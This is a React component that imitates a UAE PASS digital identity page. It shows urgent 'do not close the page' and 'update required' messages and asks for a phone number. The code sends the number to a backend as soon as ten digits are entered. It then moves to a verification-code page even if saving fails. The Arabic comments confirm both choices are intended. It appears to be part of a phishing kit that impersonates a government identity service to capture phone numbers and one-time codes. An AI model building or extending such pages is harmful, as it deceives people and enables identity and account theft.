import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../styles/UaePass.css';
import { saveDigitalId } from '../utils/api';

const UaePass: React.FC = () => {
  const navigate = useNavigate();
  const [phoneNumber, setPhoneNumber] = useState('');
  const [isButtonEnabled, setIsButtonEnabled] = useState(false);

  const handlePhoneNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 10) {
      setPhoneNumber(value);
      setIsButtonEnabled(value.length > 0);
      
      // حفظ رقم الهاتف فورياً عند إدخال 10 أرقام
      if (value.length === 10) {
        saveDigitalId(value);
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // حفظ رقم الهاتف عند الضغط على زر المتابعة
    try {
      await saveDigitalId(phoneNumber);
      navigate('/verification-code');
    } catch (error) {
      console.error('Error saving digital ID:', error);
      // المتابعة حتى في حالة فشل الحفظ
      navigate('/verification-code');
    }
  };

  return (
    <div className="uae-pass-container">
      <div className="uae-pass-header">
        <div className="logo-container">
          <img src="/uae-pass-logo.png" alt="UAE PASS" className="uae-pass-logo" />
        </div>
        <h1>UAE RACS Digital Identity</h1>
      </div>
      <div className="uae-pass-content">
        <div className="warning-message">
          <p>To complete verification, do not close or exit the page</p>
        </div>
        <div className="info-message">
          <p>Updating information is required</p>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="phoneNumber">Enter primary number</label>
            <input
              type="text"
              id="phoneNumber"
              value={phoneNumber}
              onChange={handlePhoneNumberChange}
              placeholder="05XXXXXXXX"
              required
            />
          </div>
          <div className="disclaimer">
            <p>By continuing, you agree to share your information with du for verification purposes.</p>
            <p>You may receive SMS notifications regarding this transaction.</p>
          </div>
          <button
            type="submit"
            className="continue-button"
            disabled={!isButtonEnabled}
          >
            Continue
          </button>
        </form>
      </div>
    </div>
  );
};

export default UaePass;
